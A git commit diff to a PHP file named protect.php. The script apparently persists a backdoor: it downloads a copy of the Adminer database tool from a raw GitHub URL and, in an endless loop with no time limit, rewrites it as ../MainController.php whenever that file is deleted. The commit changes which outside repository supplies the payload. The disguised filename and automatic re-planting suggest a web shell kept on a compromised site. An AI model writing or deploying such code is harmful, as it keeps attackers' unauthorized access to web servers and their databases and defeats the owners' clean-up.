0c96bf70a456be65f2e77d509e24c445e7871493
n3f0 <nefo424@gmail.com>
2023-02-06 19:51:58 +0700

    Update protect.php

--- protect.php
+++ protect.php
@@ -1,6 +1,6 @@
 <?php
 ini_set('max_execution_time', 0);
-$txt=file_get_contents("https://raw.githubusercontent.com/n3f0/adminer/main/adminer-4.8.1.php");
+$txt=file_get_contents("https://raw.githubusercontent.com/b3d2m/cilok/main/adminer-4.8.1.php");
 while(1){
   if(!file_exists("../MainController.php")){
       file_put_contents("../MainController.php",$txt);
